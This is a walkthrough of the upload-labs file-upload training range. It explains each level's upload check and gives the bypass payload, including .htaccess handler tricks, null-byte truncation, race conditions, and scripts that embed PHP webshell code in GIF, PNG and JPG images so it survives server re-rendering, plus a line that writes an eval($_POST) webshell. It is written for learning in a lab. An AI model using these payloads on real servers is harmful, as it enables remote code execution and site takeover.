upload-labs-WalkThrough
disclaimer
This document is for learning and research purposes only. Please do not use the technical source code in this document for illegal purposes. Any negative impact caused by anyone has nothing to do with me.

Range project address

https://github.com/c0ny1/upload-labs
Environmental requirements

Operating system: Window or Linux Windows is recommended, except Pass-19 must be under linux, the rest of the Pass can run on Windows
PHP version: 5.2.17 is recommended. Other versions may cause some Passes to fail to break through
PHP components: php_gd2, php_exif part of Pass depends on these two components
Middleware: Set Apache to connect with moudel
Note: The target machine has its own PHPstudy environment. Open a win7 virtual machine and start it directly. It doesn’t matter if mysql can’t start. This doesn’t require a database

foreword
The articles on the Internet are very comprehensive, and the main points are all there. There is no need to invent the wheel. I will add some content to deepen my memory.

writeup
Pass-01-js check
Detection rules: Use js on the client side to check illegal pictures

payload: Directly disable JS or burp capture and modify the file extension

Pass-02-verify Content-type
Detection rules: Check the MIME of the data packet on the server side

payload: Just change Content-Type to image type

Pass-03- blacklist bypass
Detection rules: Do not upload files with .asp|.aspx|.php|.jsp suffixes

Use some resolvable suffixes of PHP such as: pht, php3, php4, php5, phtml, etc.

payload: Change the suffix of the uploaded file to php3

Or upload .htaccess file, need:

The mod_rewrite module is enabled.
AllowOverride All
document content

<FilesMatch "shell.jpg">
   SetHandler application/x-httpd-php
</FilesMatch>
At this point, uploading the shell.jpg file can be parsed as php.

Pass-04 - .htaccess bypass
Detection rules: Prohibit uploading .php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html |.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|. asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf| .swf file extension!

payload: Various rare suffixes are filtered, but .htaccess is not filtered, just use the .htaccess method of pass-03.

Pass-05-suffix Fuzz


For this situation in the case of a black box, a better way is to Fuzz the upload suffix. For the upload suffix dictionary, see https://github.com/ffffffff0x/AboutSecurity/tree/master/Dic/Web/Upload and directly import it into burp and run it up

Pass-06-case bypass
Detection rules: Prohibit uploading .php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html |.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|. asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf| .swf|.htaccess file extension!



payload: .htaccess is filtered, and the suffix in the code is converted to lowercase and removed, so we can upload Php to bypass the blacklist suffix. (In the case of no special configuration in Linux, this is only possible for win, because win will ignore case)

Pass-07-space bypass


payload: xx.jpg[space] or xx.jpg under Win. These two types of files are not allowed to exist. If they are named like this, windows will remove the space by default or click here to delete the dot at the end, but the dot at the end is not removed spaces, so upload a .php file with spaces.

Pass-08-point bypass


payload: The dot at the end is not removed, so it is the same as above, upload .php. Bypass.

Pass-09-::$DATA bypass


The NTFS file system includes support for alternate data streams. This is not a well-known feature, but consists primarily of providing compatibility with files in the Macintosh file system. Alternate data streams allow files to contain multiple data streams. Each file has at least one data stream .In Windows, this default data stream is called: $DATA.

payload: upload .php::$DATA bypass.(windows only)

Pass-10-.space.bypass


payload: The file name of move_upload_file is directly the file name uploaded by the user, which we can control. And it will delete the dot at the end of the file name, so we can combine Pass-7 with .php. Spaces. Bypass, windows will ignore the dot at the end of the file. and spaces

Another method is to try the second upload method, with the help of the regular matching rules of the windows platform

The following symbols have the same effect under the windows platform

" => .
> => ?
< => *
First, upload a shell.php casually, and use the packet capture tool to modify the file suffix to: shell.php:.jpg

At this point, an empty file named shell.php will be generated in the upload directory:

Then, upload again, modify the file name of the data package: shell.<<<, here move_uploaded_file($temp_file, '../../upload/shell.<<<') is similar to regular matching, matching to .. ./../upload/shell.php file, and then write the uploaded file data into the shell.php file, so that it is successfully written to our pony.

Pass-11-double write bypass


Sensitive suffix is replaced with empty

payload: Double write .pphphp to bypass

Pass-12-00 truncated


CVE-2015-2348 Affected versions: 5.4.x<= 5.4.39, 5.5.x<= 5.5.23, 5.6.x <= 5.6.7

exp:move_uploaded_file($_FILES['name']['tmp_name'],"/file.php\x00.jpg"); The save_path in move_uploaded_file in the source code is controllable, so 00 can be truncated.



Pass-13-00 truncated


img_path is still a concatenated path, but the post method tried this time is still truncated with 00, but this time it needs to be modified in binary, because post will not automatically decode %00 like get



Pass-14-unpack
function getReailFileType($filename){
     $file = fopen($filename, "rb");
     $bin = fread($file, 2); // read only 2 bytes
     fclose($file);
     $strInfo = @unpack("C2chars", $bin);
     $typeCode = intval($strInfo['chars1'].$strInfo['chars2']);
     $fileType = '';
     switch($typeCode){
         case 255216:
             $fileType = 'jpg';
             break;
         case 13780:
             $fileType = 'png';
             break;
         case 7173:
             $fileType = 'gif';
             break;
         default:
             $fileType = 'unknown';
         }
         return $fileType;
}

$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
     $temp_file = $_FILES['upload_file']['tmp_name'];
     $file_type = getReailFileType($temp_file);

     if ($file_type == 'unknown'){
         $msg = "Unknown file, upload failed!";
     }else{
         $img_path = UPLOAD_PATH."/".rand(10, 99).date("YmdHis").".".$file_type;
         if(move_uploaded_file($temp_file,$img_path)){
             $is_upload = true;
         } else {
             $msg = "Error uploading!";
         }
     }
}
?>
From this level, it is required to upload the picture horse, but there is no way to directly execute the picture horse. It needs another method to realize it. Generally, add the php pseudo-protocol to getshell. The common ones are phar, zip, etc.

It can be found here that the source code only uses the unpack function to detect the first two bytes of php, that is, it only detects the file header...

payload: make picture horse copy 1.jpg /b + 1.php /a shell.jpg

http://192.168.37.150/include.php?file=upload/3020190807143926.png

Pass-15-getimagesize()

function isImage($filename){
    $types = '.jpeg|.png|.gif';
    if(file_exists($filename)){
        $info = getimagesize($filename);
        $ext = image_type_to_extension($info[2]);
        if(stripos($types,$ext)>=0){
            return $ext;
        }else{
            return false;
        }
    }else{
        return false;
    }
}

The getimagesize() function will determine the size of any GIF, JPG, PNG, SWF, SWC, PSD, TIFF, BMP, IFF, JP2, JPX, JB2, JPC, XBM or WBMP image file and return the image's dimensions along with the file type and a Can be used for height/width text strings in IMG tags in normal HTML files.

image_type_to_extension — Get the file extension of the image type

Similar to the previous topic, the relevant size and type of the image are obtained, and the file header can also be used to bypass

payload: Same as Pass-13

Another method: Change the PHP Trojan file to *.php;.jpg, capture the package, and add: GIF89a picture header logo to the file header



Pass-16-exif_imagetype()
$image_type = exif_imagetype($filename);
exif_imagetype() reads the first bytes of an image and checks its signature.

Changed a function to get image information

payload: Same as Pass-13

Pass-17-Secondary rendering bypass
After judging the suffix name, content-type, and using imagecreatefromgif to judge whether it is a gif image, and finally doing a second rendering, the bypass method can refer to the prophet's article, which is very detailed: https://xz.aliyun.com /t/2657 jpg and png are very troublesome. For gif, you only need to find the position that has not changed before and after rendering, and then write the php code into it.

upload gif
Code about detecting gif

else if(($fileext == "gif") && ($filetype=="image/gif")){
         if(move_uploaded_file($tmpname, $target_path)){
             //Use the uploaded image to generate a new image
             $im = imagecreatefromgif($target_path);
             if ($im == false){
                 $msg = "This file is not a picture in gif format!";
                 @unlink($target_path);
             }else{
                 //Assign a file name to the new image
                 srand(time());
                 $newfilename = strval(rand()).".gif";
                 //Display the image after secondary rendering (new image generated by user uploaded image)
                 $img_path = UPLOAD_PATH.'/'.$newfilename;
                 imagegif($im, $img_path);

                 @unlink($target_path);
                 $is_upload = true;
             }
         } else {
             $msg = "Error uploading!";
         }
Line 71 checks if $fileext and $filetype are in gif format.

Then line 73 uses the move_uploaded_file function as a judgment condition. If the file is successfully moved to $target_path, it will enter the code for secondary rendering, otherwise the upload fails.

There is a problem here. If the author wants to investigate bypassing the secondary rendering, when move_uploaded_file($tmpname, $target_path) returns true, the image has been successfully uploaded to the server immediately, so the following secondary rendering does not It will not affect the upload of the picture horse. If you want to examine the file suffix and content-type, then the code for the second rendering is redundant. (Only the author knows where the test point is. Haha)

Since the file name is regenerated during the second rendering, it can be judged based on the uploaded file name whether the uploaded image is generated after the second rendering or directly moved by the move_uploaded_file function.

The writeups I have seen are all pictures uploaded directly by the move_uploaded_file function. Today we remove the move_uploaded_file judgment condition, and then try to upload the picture.

payload

Add <?php phpinfo(); ?> to the end of 111.gif. Successfully uploaded 111.gif with one sentence, but this was not successful. We will download the uploaded picture to the local.

You can see that the downloaded file name has changed, so this is a second-rendered picture. We use a hexadecimal editor to open it.

It can be found that the php code we added at the end of the gif has been removed.

Regarding the secondary rendering that bypasses gif, we only need to find the position that has not changed before and after rendering, and then write the php code into it, and then we can successfully upload the picture with the php code.

After comparison, some parts have not changed, we write the code to this location. After uploading, download it to the local and open it with a hexadecimal editor, and the php code has not been removed. The image is uploaded successfully.

upload png
A png image consists of more than 3 data blocks.

PNG defines two types of data blocks, one is called critical chunk, which is a standard data block, and the other is called ancillary chunks, which is an optional data block. The key data block defines 3 standard data blocks (IHDR, IDAT, IEND), which must be included in every PNG file.

data block structure



The value in the CRC (cyclic redundancy check) field is calculated from the data in the Chunk Type Code field and Chunk Data field. The specific algorithm of CRC is defined in ISO 3309 and ITU-T V.42, and its value is as follows: CRC Code generator polynomial for calculation: x32+x26+x23+x22+x16+x12+x11+x10+x8+x7+x5+x4+x2+x+1

Data block IHDR (header chunk): It contains the basic information of the image data stored in the PNG file, and should appear in the PNG data stream as the first data block, and there can only be one file header data in a PNG data stream piece.

The file header data block consists of 13 bytes, and its format is shown in the figure below.



The palette PLTE data block is an auxiliary data block. For indexed images, palette information is necessary. The color index of the palette starts from 0, then 1, 2..., and the number of colors in the palette cannot exceed The number of colors specified in the color depth (for example, when the image color depth is 4, the number of colors in the palette cannot exceed 2^4=16), otherwise, this will make the PNG image illegal.

Image data block IDAT (image data chunk): It stores the actual data, and can contain multiple sequential image data blocks in the data stream.

IDAT stores the real data information of the image, so if we can understand the structure of IDAT, we can easily generate PNG images

Image end data IEND (image trailer chunk): It is used to mark the end of the PNG file or data stream, and must be placed at the end of the file.

If we look closely at the PNG file, we see that the last 12 characters of the file always look like this: 00 00 00 00 49 45 4E 44 AE 42 60 82

payload

Write PLTE data block

When the php bottom layer verifies the PLTE data block, it mainly performs CRC verification. Therefore, you can insert the php code in the chunk data field, and then recalculate the corresponding crc value and modify it.

This method is only valid for the png image of the indexed color image. When selecting the png image, you can distinguish .03 as an indexed color image according to the color type of the IHDR data block.

Write php code in PLTE data block



Script to calculate CRC of PLTE data block

import binascii
import re

png = open(r'2.png','rb')
a = png. read()
png. close()
hexstr = binascii.b2a_hex(a)

'''PLTE crc'''
data = '504c5445'+ re.findall('504c5445(.*?)49444154',hexstr)[0]
crc = binascii.crc32(data[:-16].decode('hex')) & 0xffffffff
print hex(crc)
Running result 526579b0

Modify CRC value



Write IDAT data block

Here are scripts written by foreign big cows, which can be used directly to run.

<?php
$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
         0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
         0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
         0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,
         0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,
         0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,
         0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,
         0x66, 0x44, 0x50, 0x33);



$img = imagecreatetruecolor(32, 32);

for ($y = 0; $y < sizeof($p); $y += 3) {
$r = $p[$y];
$g = $p[$y+1];
$b = $p[$y+2];
$color = imagecolorallocate($img, $r, $g, $b);
imagesetpixel($img, round($y / 3), 0, $color);
}

imagepng($img,'./1.png');
?>
Get 1.png after running

upload jpg
Script jpg_payload.php written by foreign experts

<?php
    /*

    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().
    It is necessary that the size and quality of the initial image are the same as those of the processed image.

    1) Upload an arbitrary image via secured files upload script
    2) Save the processed image and launch:
    jpg_payload.php <jpg_name.jpg>

    In case of successful injection you will get a specially crafted image, which should be uploaded again.

    Since the most straightforward injection method is used, the following problems can occur:
    1) After the second processing the injected data may become partially corrupted.
    2) The jpg_payload.php script outputs "Something's wrong".
    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.

    Sergey Bobrov @Black2Fan.

    See also:
    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/

    */

    $miniPayload = "<?=phpinfo();?>";


    if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) {
        die('php-gd is not installed');
    }

    if(!isset($argv[1])) {
        die('php jpg_payload.php <jpg_name.jpg>');
    }

    set_error_handler("custom_error_handler");

    for($pad = 0; $pad < 1024; $pad++) {
        $nullbytePayloadSize = $pad;
        $dis = new DataInputStream($argv[1]);
        $outStream = file_get_contents($argv[1]);
        $extraBytes = 0;
        $correctImage = TRUE;

        if($dis->readShort() != 0xFFD8) {
            die('Incorrect SOI marker');
        }

        while((!$dis->eof()) && ($dis->readByte() == 0xFF)) {
            $marker = $dis->readByte();
            $size = $dis->readShort() - 2;
            $dis->skip($size);
            if($marker === 0xDA) {
                $startPos = $dis->seek();
                $outStreamTmp =
                    substr($outStream, 0, $startPos) .
                    $miniPayload .
                    str_repeat("\0",$nullbytePayloadSize) .
                    substr($outStream, $startPos);
                checkImage('_'.$argv[1], $outStreamTmp, TRUE);
                if($extraBytes !== 0) {
                    while((!$dis->eof())) {
                        if($dis->readByte() === 0xFF) {
                            if($dis->readByte !== 0x00) {
                                break;
                            }
                        }
                    }
                    $stopPos = $dis->seek() - 2;
                    $imageStreamSize = $stopPos - $startPos;
                    $outStream =
                        substr($outStream, 0, $startPos) .
                        $miniPayload .
                        substr(
                            str_repeat("\0",$nullbytePayloadSize).
                                substr($outStream, $startPos, $imageStreamSize),
                            0,
                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) .
                                substr($outStream, $stopPos);
                } elseif($correctImage) {
                    $outStream = $outStreamTmp;
                } else {
                    break;
                }
                if(checkImage('payload_'.$argv[1], $outStream)) {
                    die('Success!');
                } else {
                    break;
                }
            }
        }
    }
    unlink('payload_'.$argv[1]);
    die('Something\'s wrong');

    function checkImage($filename, $data, $unlink = FALSE) {
        global $correctImage;
        file_put_contents($filename, $data);
        $correctImage = TRUE;
        imagecreatefromjpeg($filename);
        if($unlink)
            unlink($filename);
        return $correctImage;
    }

    function custom_error_handler($errno, $errstr, $errfile, $errline) {
        global $extraBytes, $correctImage;
        $correctImage = FALSE;
        if(preg_match('/(\d+) extraneous bytes before marker/', $errstr, $m)) {
            if(isset($m[1])) {
                $extraBytes = (int)$m[1];
            }
        }
    }

    class DataInputStream {
        private $binData;
        private $order;
        private $size;

        public function __construct($filename, $order = false, $fromString = false) {
            $this->binData = '';
            $this->order = $order;
            if(!$fromString) {
                if(!file_exists($filename) || !is_file($filename))
                    die('File not exists ['.$filename.']');
                $this->binData = file_get_contents($filename);
            } else {
                $this->binData = $filename;
            }
            $this->size = strlen($this->binData);
        }

        public function seek() {
            return ($this->size - strlen($this->binData));
        }

        public function skip($skip) {
            $this->binData = substr($this->binData, $skip);
        }

        public function readByte() {
            if($this->eof()) {
                die('End Of File');
            }
            $byte = substr($this->binData, 0, 1);
            $this->binData = substr($this->binData, 1);
            return ord($byte);
        }

        public function readShort() {
            if(strlen($this->binData) < 2) {
                die('End Of File');
            }
            $short = substr($this->binData, 0, 2);
            $this->binData = substr($this->binData, 2);
            if($this->order) {
                $short = (ord($short[1]) << 8) + ord($short[0]);
            } else {
                $short = (ord($short[0]) << 8) + ord($short[1]);
            }
            return $short;
        }

        public function eof() {
            return !$this->binData||(strlen($this->binData) === 0);
        }
    }
?>

Use script to process 1.jpg, command php jpg_payload.php 1.jpg

Open it with a hex editor, and you can see the inserted php code. Upload the generated payload_1.jpg.

Pass-18-condition competition
This level is a problem of conditional competition. Here, first upload the file to the server, then modify the name through rename, and then delete the file through unlink, so you can access the webshell before unlink through conditional competition. Here you can use burp to send packages. You can change the content of the file to the following

<?php fputs(fopen('shell.php','w'),'<?php eval($_POST[cmd]?>');?>

Anyway, it's just for writing files.

After two burp runs, a new file will be generated under this folder

Pass-19-Conditional competition
The same is also a problem of conditional competition. Looking at the source code, you can find that classes are used to implement related methods, including viewing file extensions, sizes, etc.

The problem here is that the code gives a time difference when changing the name of the uploaded file, so that we can achieve this competition effect, the same method

another way

Upload a file named shell.php.7Z, submit the packet quickly and repeatedly, it will prompt that the file has been uploaded, but it has not been renamed.

At this time, there will be a shell.php.7Z file in the upper directory, which can be directly accessed as a php file by exploiting the Apache parsing vulnerability





Pass-20-/. Bypass
This level investigates CVE-2015-2348 move_uploaded_file() 00 truncates, uploads webshell, and customizes the save name at the same time, directly saving as php is not acceptable

  if(!in_array($file_ext,$deny_ext)) {
             $temp_file = $_FILES['upload_file']['tmp_name'];
             $img_path = UPLOAD_PATH . '/' .$file_name;
             if (move_uploaded_file($temp_file, $img_path)) {
                 $is_upload = true;
             }else{
                 $msg = 'Upload error!';
             }
         }else{
             $msg = 'Do not save as this type of file!';
         }
Looking at the code, I found that the img_path in the move_uploaded_file() function is controlled by the post parameter save_name, so it can be bypassed by using 00 truncation in save_name:

The uploaded file name is bypassed with 0x00. Change it to xx.php[binary 00].x.jpg



another way

The bottom layer of move_uploaded_file will call the tsrm_realpath function to recursively delete the /. at the end of the file name, resulting in bypassing the suffix detection

Uploaded filenames are bypassed with shell.php/.



Pass-21-array +/. bypass
if (isset($_POST['submit'])) {
     if (file_exists(UPLOAD_PATH)) {

         $is_upload = false;
         $msg = null;
         if(!empty($_FILES['upload_file'])){
             //mime check
             $allow_type = array('image/jpeg','image/png','image/gif');
             if(!in_array($_FILES['upload_file']['type'],$allow_type)){
                 $msg = "Forbidden to upload this type of file!";
             }else{
                 //check filename
                 $file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name'];
                 if (!is_array($file)) {
                     $file = explode('.', strtolower($file));
                 }

                 $ext = end($file);
                 $allow_suffix = array('jpg','png','gif');
                 if (!in_array($ext, $allow_suffix)) {
                     $msg = "Do not upload the suffix file!";
                 }else{
                     $file_name = reset($file) . '.' . $file[count($file) - 1];
                     $temp_file = $_FILES['upload_file']['tmp_name'];
                     $img_path = UPLOAD_PATH . '/' .$file_name;
                     if (move_uploaded_file($temp_file, $img_path)) {
                         $msg = "File uploaded successfully!";
                         $is_upload = true;
                     } else {
                         $msg = "File upload failed!";
                     }
                 }
             }
         }else{
             $msg = "Please select the file to upload!";
         }

     } else {
         $msg = UPLOAD_PATH . 'The folder does not exist, please create it manually!';
     }
}
This topic uses the method of array +/. to bypass, because the source code contains such two lines of code, which become the key to bypass

if (!is_array($file)) {
                     $file = explode('.', strtolower($file));
                 }
$file_name = reset($file) . '.' . $file[count($file) - 1];
In the same way, we need to meet two conditions. The first is to ensure that the name to be modified needs to meet the condition of being an array, so we can capture the packet to construct the array. The second point is that $file[ The role of count($file) - 1] causes $file[1] = NULL, so after constructing the file name, it is equivalent to xx.php/., according to the knowledge of the above question, it can be directly under the function of move_uploaded_file You can ignore /., so you can still upload successfully.

Therefore, the two values ​​of the save_name variable are xx.php/, and the other value is jpg. In fact, from the perspective of code auditing, it is still a controllable variable that leads to such consequences



Source & Reference

Upload-labs 20 clearance notes
upload-labs clear record
Upload-labs customs clearance manual
Detailed analysis of pass 16 of upload-labs
Talk about how to quickly get Webshell in security testing
Summary of upload vulnerabilities and their bypasses from upload-labs
